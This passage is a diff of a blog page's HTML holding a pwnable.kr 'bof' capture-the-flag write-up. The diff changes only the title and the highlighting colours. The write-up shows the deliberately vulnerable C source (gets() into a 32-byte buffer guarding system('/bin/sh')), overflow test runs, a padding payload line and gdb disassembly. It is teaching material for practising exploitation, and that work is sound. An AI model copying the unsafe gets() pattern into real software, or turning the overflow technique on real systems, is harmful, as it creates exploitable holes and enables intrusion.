@@ -2,7 +2,7 @@
 <html lang="en">
   <head>
     <title>
-        pwnable.kr - bof writeup - A personal cybersecurity blog
+        pwnable.kr - bof writeup - fmash16&#39;s blog
       </title>
         <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
@@ -21,10 +21,10 @@
     
     <meta name="description" content="difficulty --&gt; easy" />
     <meta name="generator" content="Hugo 0.71.0 with theme pure" />
-    <title>pwnable.kr - bof writeup - A personal cybersecurity blog</title>
+    <title>pwnable.kr - bof writeup - fmash16&#39;s blog</title>
     
     
-    <link rel="stylesheet" href="/css/style.min.d25af0bab4d33793898dbd0b3c2137b1b04a01c67b4d3321370361298f0ae3de.css">
+    <link rel="stylesheet" href="/css/style.min.bef22498336108fd63d73af3a80f7d93e90f4ab8174c15d0ce0fe149dcf0312b.css">
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
     <meta property="og:title" content="pwnable.kr - bof writeup" />
@@ -415,36 +415,36 @@ Download : <a href="http://pwnable.kr/bin/bof.c">http://pwnable.kr/bin/bof.c</a>
 </blockquote>
 <h2 id="solution">Solution:</h2>
 <p>We get the files and run the executable bof</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>$./bof
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>overflow me : 
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>AAAAAAAAAAAAAAAAAAAAAAAAAAA
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>Nah..
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>$./bof
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>overflow me : 
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>Nah..
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>*** stack smashing detected ***: ./bof terminated
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>Aborted
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span>$./bof
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span>overflow me : 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span>AAAAAAAAAAAAAAAAAAAAAAAAAAA
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span>Nah..
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>$./bof
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>overflow me : 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>Nah..
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>*** stack smashing detected ***: ./bof terminated
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>Aborted
 </code></pre></div><p>The program asks for an input and on bufferoverflow, it detects stack smashing.
 We have a look at the source code bof.c</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#776e71">#include</span> <span style="color:#776e71">&lt;stdio.h&gt;</span><span style="color:#776e71">
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#776e71">#include</span> <span style="color:#776e71">&lt;string.h&gt;</span><span style="color:#776e71">
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#776e71">#include</span> <span style="color:#776e71">&lt;stdlib.h&gt;</span><span style="color:#776e71">
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#776e71"></span><span style="color:#fec418">void</span> <span style="color:#06b6ef">func</span>(<span style="color:#fec418">int</span> key){
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>        <span style="color:#fec418">char</span> overflowme[<span style="color:#f99b15">32</span>];
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>        printf(<span style="color:#48b685">&#34;overflow me : &#34;</span>);
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>        gets(overflowme);       <span style="color:#776e71">// smash me!
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#776e71"></span>        <span style="color:#815ba4">if</span>(key <span style="color:#5bc4bf">==</span> <span style="color:#f99b15">0xcafebabe</span>){
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>                system(<span style="color:#48b685">&#34;/bin/sh&#34;</span>);
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>        }
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>        <span style="color:#815ba4">else</span>{
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>                printf(<span style="color:#48b685">&#34;Nah..</span><span style="color:#f99b15">\n</span><span style="color:#48b685">&#34;</span>);
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>        }
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>}
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span style="color:#fec418">int</span> <span style="color:#06b6ef">main</span>(<span style="color:#fec418">int</span> argc, <span style="color:#fec418">char</span><span style="color:#5bc4bf">*</span> argv[]){
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>        func(<span style="color:#f99b15">0xdeadbeef</span>);
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>        <span style="color:#815ba4">return</span> <span style="color:#f99b15">0</span>;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>}
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;string.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#cd2828;font-weight:bold"></span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">func</span>(<span style="color:#6ab825;font-weight:bold">int</span> key){
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>        <span style="color:#6ab825;font-weight:bold">char</span> overflowme[<span style="color:#3677a9">32</span>];
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>        printf(<span style="color:#ed9d13">&#34;overflow me : &#34;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>        gets(overflowme);       <span style="color:#999;font-style:italic">// smash me!
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span><span style="color:#999;font-style:italic"></span>        <span style="color:#6ab825;font-weight:bold">if</span>(key == <span style="color:#3677a9">0xcafebabe</span>){
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>                system(<span style="color:#ed9d13">&#34;/bin/sh&#34;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>        }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>        <span style="color:#6ab825;font-weight:bold">else</span>{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>                printf(<span style="color:#ed9d13">&#34;Nah..</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span>        }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span>}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span>(<span style="color:#6ab825;font-weight:bold">int</span> argc, <span style="color:#6ab825;font-weight:bold">char</span>* argv[]){
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span>        func(<span style="color:#3677a9">0xdeadbeef</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span>        <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span>}
 </code></pre></div><p>We are interested in the function <code>func</code>. It is called with the argument
 <code>0xdeadbeef</code>. It takes the user input using the vulnerable <code>gets</code>
 function and writes the input to the variable <code>overflowme</code> which we are to
@@ -458,156 +458,156 @@ the same directory</p>
 <pre><code class="language-shellsession" data-lang="shellsession">$python -c &quot;print('A'*32)&quot; &gt; payload
 </code></pre><p>Now, we open the program in gdb and set breakpoint at function <code>func</code> and
 run with input from the file <code>payload</code></p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>(gdb) disas func
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>Dump of assembler code <span style="color:#815ba4">for</span> function func:
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>   <span style="color:#f99b15">0x0000062c</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">0</span><span style="color:#5bc4bf">&gt;</span>: push   ebp
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>   <span style="color:#f99b15">0x0000062d</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">1</span><span style="color:#5bc4bf">&gt;</span>: mov    ebp,esp
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>   <span style="color:#f99b15">0x0000062f</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">3</span><span style="color:#5bc4bf">&gt;</span>: sub    esp,<span style="color:#f99b15">0x48</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>   <span style="color:#f99b15">0x00000632</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">6</span><span style="color:#5bc4bf">&gt;</span>: mov    eax,gs:<span style="color:#f99b15">0x14</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>   <span style="color:#f99b15">0x00000638</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">12</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [ebp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0xc</span>],eax
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>   <span style="color:#f99b15">0x0000063b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">15</span><span style="color:#5bc4bf">&gt;</span>:  xor    eax,eax
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>   <span style="color:#f99b15">0x0000063d</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">17</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],<span style="color:#f99b15">0x78c</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>   <span style="color:#f99b15">0x00000644</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">24</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0x645</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">25</span><span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>   <span style="color:#f99b15">0x00000649</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">29</span><span style="color:#5bc4bf">&gt;</span>:  lea    eax,[ebp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x2c</span>]
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>   <span style="color:#f99b15">0x0000064c</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">32</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],eax
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>   <span style="color:#f99b15">0x0000064f</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">35</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0x650</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">36</span><span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>   <span style="color:#f99b15">0x00000654</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">40</span><span style="color:#5bc4bf">&gt;</span>:  cmp    DWORD PTR [ebp<span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x8</span>],<span style="color:#f99b15">0xcafebabe</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>   <span style="color:#f99b15">0x0000065b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">47</span><span style="color:#5bc4bf">&gt;</span>:  jne    <span style="color:#f99b15">0x66b</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">63</span><span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>   <span style="color:#f99b15">0x0000065d</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">49</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],<span style="color:#f99b15">0x79b</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>   <span style="color:#f99b15">0x00000664</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">56</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0x665</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">57</span><span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>   <span style="color:#f99b15">0x00000669</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">61</span><span style="color:#5bc4bf">&gt;</span>:  jmp    <span style="color:#f99b15">0x677</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">75</span><span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>   <span style="color:#f99b15">0x0000066b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">63</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],<span style="color:#f99b15">0x7a3</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>   <span style="color:#f99b15">0x00000672</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">70</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0x673</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">71</span><span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>   <span style="color:#f99b15">0x00000677</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">75</span><span style="color:#5bc4bf">&gt;</span>:  mov    eax,DWORD PTR [ebp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0xc</span>]
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>   <span style="color:#f99b15">0x0000067a</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">78</span><span style="color:#5bc4bf">&gt;</span>:  xor    eax,DWORD PTR gs:<span style="color:#f99b15">0x14</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>   <span style="color:#f99b15">0x00000681</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">85</span><span style="color:#5bc4bf">&gt;</span>:  je     <span style="color:#f99b15">0x688</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">92</span><span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>   <span style="color:#f99b15">0x00000683</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">87</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0x684</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">88</span><span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>   <span style="color:#f99b15">0x00000688</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">92</span><span style="color:#5bc4bf">&gt;</span>:  leave  
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>   <span style="color:#f99b15">0x00000689</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">93</span><span style="color:#5bc4bf">&gt;</span>:  ret    
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>End of assembler dump<span style="color:#5bc4bf">.</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>(gdb) b func
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>Breakpoint <span style="color:#f99b15">1</span> at <span style="color:#f99b15">0x632</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>(gdb) r <span style="color:#5bc4bf">&lt;</span> payload
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>Starting program: <span style="color:#5bc4bf">/</span>home<span style="color:#5bc4bf">/</span>fmash<span style="color:#5bc4bf">/</span>ctf<span style="color:#5bc4bf">/</span>pwnable<span style="color:#5bc4bf">/</span>toddler<span style="color:#48b685">&#39;s_bottle/bof/bof &lt; payload</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>Breakpoint <span style="color:#f99b15">1</span>, <span style="color:#f99b15">0x56555632</span> <span style="color:#5bc4bf">in</span> func ()
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span>(gdb) disas func
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span>Dump of assembler code <span style="color:#6ab825;font-weight:bold">for</span> function func:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span>   <span style="color:#3677a9">0x0000062c</span> &lt;+<span style="color:#3677a9">0</span>&gt;: push   ebp
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span>   <span style="color:#3677a9">0x0000062d</span> &lt;+<span style="color:#3677a9">1</span>&gt;: mov    ebp,esp
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>   <span style="color:#3677a9">0x0000062f</span> &lt;+<span style="color:#3677a9">3</span>&gt;: sub    esp,<span style="color:#3677a9">0x48</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>   <span style="color:#3677a9">0x00000632</span> &lt;+<span style="color:#3677a9">6</span>&gt;: mov    eax,gs:<span style="color:#3677a9">0x14</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>   <span style="color:#3677a9">0x00000638</span> &lt;+<span style="color:#3677a9">12</span>&gt;:  mov    DWORD PTR [ebp-<span style="color:#3677a9">0xc</span>],eax
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>   <span style="color:#3677a9">0x0000063b</span> &lt;+<span style="color:#3677a9">15</span>&gt;:  xor    eax,eax
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>   <span style="color:#3677a9">0x0000063d</span> &lt;+<span style="color:#3677a9">17</span>&gt;:  mov    DWORD PTR [esp],<span style="color:#3677a9">0x78c</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>   <span style="color:#3677a9">0x00000644</span> &lt;+<span style="color:#3677a9">24</span>&gt;:  call   <span style="color:#3677a9">0x645</span> &lt;func+<span style="color:#3677a9">25</span>&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>   <span style="color:#3677a9">0x00000649</span> &lt;+<span style="color:#3677a9">29</span>&gt;:  lea    eax,[ebp-<span style="color:#3677a9">0x2c</span>]
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>   <span style="color:#3677a9">0x0000064c</span> &lt;+<span style="color:#3677a9">32</span>&gt;:  mov    DWORD PTR [esp],eax
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span>   <span style="color:#3677a9">0x0000064f</span> &lt;+<span style="color:#3677a9">35</span>&gt;:  call   <span style="color:#3677a9">0x650</span> &lt;func+<span style="color:#3677a9">36</span>&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span>   <span style="color:#3677a9">0x00000654</span> &lt;+<span style="color:#3677a9">40</span>&gt;:  <span style="color:#24909d">cmp</span>    DWORD PTR [ebp+<span style="color:#3677a9">0x8</span>],<span style="color:#3677a9">0xcafebabe</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span>   <span style="color:#3677a9">0x0000065b</span> &lt;+<span style="color:#3677a9">47</span>&gt;:  jne    <span style="color:#3677a9">0x66b</span> &lt;func+<span style="color:#3677a9">63</span>&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span>   <span style="color:#3677a9">0x0000065d</span> &lt;+<span style="color:#3677a9">49</span>&gt;:  mov    DWORD PTR [esp],<span style="color:#3677a9">0x79b</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span>   <span style="color:#3677a9">0x00000664</span> &lt;+<span style="color:#3677a9">56</span>&gt;:  call   <span style="color:#3677a9">0x665</span> &lt;func+<span style="color:#3677a9">57</span>&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span>   <span style="color:#3677a9">0x00000669</span> &lt;+<span style="color:#3677a9">61</span>&gt;:  jmp    <span style="color:#3677a9">0x677</span> &lt;func+<span style="color:#3677a9">75</span>&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">19</span>   <span style="color:#3677a9">0x0000066b</span> &lt;+<span style="color:#3677a9">63</span>&gt;:  mov    DWORD PTR [esp],<span style="color:#3677a9">0x7a3</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">20</span>   <span style="color:#3677a9">0x00000672</span> &lt;+<span style="color:#3677a9">70</span>&gt;:  call   <span style="color:#3677a9">0x673</span> &lt;func+<span style="color:#3677a9">71</span>&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">21</span>   <span style="color:#3677a9">0x00000677</span> &lt;+<span style="color:#3677a9">75</span>&gt;:  mov    eax,DWORD PTR [ebp-<span style="color:#3677a9">0xc</span>]
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">22</span>   <span style="color:#3677a9">0x0000067a</span> &lt;+<span style="color:#3677a9">78</span>&gt;:  xor    eax,DWORD PTR gs:<span style="color:#3677a9">0x14</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">23</span>   <span style="color:#3677a9">0x00000681</span> &lt;+<span style="color:#3677a9">85</span>&gt;:  je     <span style="color:#3677a9">0x688</span> &lt;func+<span style="color:#3677a9">92</span>&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">24</span>   <span style="color:#3677a9">0x00000683</span> &lt;+<span style="color:#3677a9">87</span>&gt;:  call   <span style="color:#3677a9">0x684</span> &lt;func+<span style="color:#3677a9">88</span>&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">25</span>   <span style="color:#3677a9">0x00000688</span> &lt;+<span style="color:#3677a9">92</span>&gt;:  leave  
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">26</span>   <span style="color:#3677a9">0x00000689</span> &lt;+<span style="color:#3677a9">93</span>&gt;:  ret    
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">27</span>End of assembler dump.
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">28</span>(gdb) b func
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">29</span>Breakpoint <span style="color:#3677a9">1</span> at <span style="color:#3677a9">0x632</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">30</span>(gdb) r &lt; payload
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">31</span>Starting program: /home/fmash/ctf/pwnable/toddler<span style="color:#ed9d13">&#39;s_bottle/bof/bof &lt; payload</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">32</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">33</span>Breakpoint <span style="color:#3677a9">1</span>, <span style="color:#3677a9">0x56555632</span> <span style="color:#6ab825;font-weight:bold">in</span> func ()
 </code></pre></div><p>We set a breakpoint at the line 40 where our input is compared with the
 required value <code>0xcafebabe</code> and examine the stack after continuing.</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>(gdb) disas func
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>Dump of assembler code <span style="color:#815ba4">for</span> function func:
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>   <span style="color:#f99b15">0x5655562c</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">0</span><span style="color:#5bc4bf">&gt;</span>: push   ebp
